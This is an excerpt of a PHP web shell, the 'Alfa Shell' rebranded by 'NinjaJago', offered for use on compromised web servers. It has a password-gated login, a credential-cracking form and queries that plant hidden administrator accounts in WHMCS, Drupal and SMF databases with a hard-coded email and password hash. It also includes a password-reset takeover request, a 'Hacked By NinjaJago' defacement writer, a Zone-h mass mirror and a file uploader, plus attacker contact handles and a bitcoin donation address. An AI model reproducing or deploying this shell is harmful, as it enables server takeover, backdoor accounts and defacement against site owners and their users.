...
define("__ALFA_DATA_FOLDER__", "NINJAJAGO_DATA");
...
$GLOBALS['__ALFA_COLOR__'] = array(
		...
		"main_owner_group" => "#00ffc8",
		"main_green_perm" => "#00ff00",
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://c.tenor.com/YisMHdFzUOcAAAAd/tenor.gif" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ Alfa Shell Ninja Jago ~</b></font></th></tr>
...
}elseif($config['AlfaLoginPage']=='nulz'){
if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
if(@md5($_POST["password"])==$config['AlfaPass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
	...
	echo '<script>alert("contact me @zoughu")</script>';
}
echo '
<html lang="en">
...
<head>
    ...
    <link href="https://c.tenor.com/YisMHdFzUOcAAAAd/tenor.gif" rel="shortcut icon" type="image/x-icon">
    <link rel="apple-touch-icon" href="https://c.tenor.com/YisMHdFzUOcAAAAd/tenor.gif"/>
    ...
    * {
    ...
    body {
        background-image: url("https://c.tenor.com/YisMHdFzUOcAAAAd/tenor.gif"), linear-gradient(rgba(0, 0, 0, 0.5), rgba(255, 255, 255, 0.5));
    ...
    <div class="terminal">
        ...
        <div class="passwd">
            <form action="" method="post">
                <label for="password">root@ninjajago:</label>
...
╰──➤
    ...
    typewriter
        .pauseFor(500)
        .typeString("Ninja Jago Shell")
        .pauseFor(2000)
        .deleteChars(30)
        .typeString("Edited By NinjaJago")
        .pauseFor(2000)
        .start();
    </script>
</body>
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ Alfa Shell NinjaJago ::..</title>
<style type="text/css">';?>
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?winjago"><span style="color:#42ff59;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://c.tenor.com/YisMHdFzUOcAAAAd/tenor.gif" /></td>
</tr>
<tr>
...
$cwd = 'Example: /home/user/public_html/index.php';
if($_POST['alfa1']=='file'){
...
$port = $_POST['alfa2'];
$usernames= $_POST['alfa3'];$passwords = $_POST['alfa4'];
$fcrack = $_POST['alfa5'];
...
$create = "insert into tblclients (email) values('monaratuliuu198@gmail.com')";
...
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=monaratuliuu198@gmail.com");
...
$code = '';
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ Alfa Shell Ninja Jago &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: bc1q9pq38fg09kenj0fqmamhl6fxeemw60j7uh5jax\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>monaratuliuu198@gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://haxorstars.t.me'>@zoughu</a></span></div></td>
</tr>
</table>
</div>
...
<title>Hacked By NinjaJago</title><textarea name=index rows='19' cols='103'><b>Hacked By NinjaJago</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
$php="";
...
$python="";
...
$perl="";
...
$ruby="";
...
$node="";
...
$c="";
...
$java="";
...
echo '
<center><br><div class="txtfont_header">| Zone-h Mass Mirror |</div><center><br>
...
echo '</select><br>
<textarea name="domain" cols="90" rows="20" placeholder="https://domain.com"></textarea><br>
...
$table = array('td1' =>
 ...
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'monaratuliuu198@gmail.com', 'inputSize' => '50')
);
create_table($table);
...
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','monaratuliuu198@gmail.com','filtered_html','1','Europe/Berlin','monaratuliuu198@gmail.com')") or die(mysqli_error($conn));
...
$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','monaratuliuu198@gmail.com')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
...
<div class="txtfont">
Method: <select name="method"><option value="name">Find Files By Name</option><option value="str">Find String In Files</option></select>String: <input type="text" name="string" value="">
...
if($m == 'index'){
$indexs = array('index.php','index.htm','index.html','default.asp','default.aspx','index.asp','index.aspx','index.jsp','index.cshtml','index.js');
